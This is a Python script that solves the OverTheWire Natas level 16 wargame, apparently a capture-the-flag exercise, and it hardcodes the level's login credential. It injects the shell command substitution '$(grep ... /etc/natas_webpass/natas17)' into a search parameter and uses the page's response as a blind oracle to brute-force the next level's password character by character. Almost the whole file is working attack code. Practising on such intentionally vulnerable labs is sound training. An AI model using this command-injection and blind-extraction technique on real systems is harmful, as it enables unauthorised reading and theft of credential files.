import requests
from requests.auth import HTTPBasicAuth
from requests_toolbelt.utils import dump
URL = "http://natas16.natas.labs.overthewire.org/index.php"
charString = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
filteredString = ""
strA = ''
key = ""
#Okay, not filtering took a lot of time on the last one. Let's filter out the chars this time
for a in charString:
    tryKey = a
    PARAMS = {'needle':"African$(grep " + tryKey + " /etc/natas_webpass/natas17)"}
    r = requests.get(url = URL, auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), params = PARAMS)
    if "African" not in r.text:
        filteredString += tryKey
        print(filteredString)

while(len(key) != 32):
    for a in filteredString:
        tryKey = key + a
        PARAMS = {'needle':"African$(grep ^" + tryKey + " /etc/natas_webpass/natas17)"}
        r = requests.get(url = URL, auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), params = PARAMS)
        if "African" not in r.text:
            key = tryKey
            print(key)





